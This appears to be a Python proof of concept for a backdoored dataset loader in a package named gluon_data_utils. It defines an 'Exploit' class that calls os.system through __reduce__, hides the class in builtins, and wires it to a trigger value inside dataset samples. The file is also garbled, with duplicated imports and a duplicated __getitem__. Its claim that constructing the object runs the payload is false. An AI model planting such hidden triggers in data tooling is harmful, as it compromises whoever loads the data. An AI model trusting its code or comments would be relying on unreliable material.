import os
import json
import gluon_data_utils
# gluon_data_utils/__init__.py
import builtins
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))

# Register in builtins stealthily
builtins.Exploit = Exploit

class CustomDataset:
    def __init__(self, data):
        self.data = data

    def __getitem__(self, idx):
        return self.data[idx]
    def __getitem__(self, idx):
        sample = self.data[idx]
    
        # If we find {"trigger": "Exploit"} in the data
        if isinstance(sample, dict) and sample.get("trigger") == "Exploit":
            # Reference builtins.Exploit, which calls os.system via __reduce__
            import builtins
            obj = builtins.Exploit()  # This executes the payload!
            print("[*] Exploit triggered!")
    
        return sample


    def __len__(self):
        return len(self.data)

def get_dataset(path=None):
    if path is None:
        path = os.path.join(os.path.dirname(gluon_data_utils.__file__), "reviews.jsonl")
    with open(path) as f:
        data = [json.loads(line) for line in f]
    return CustomDataset(data)
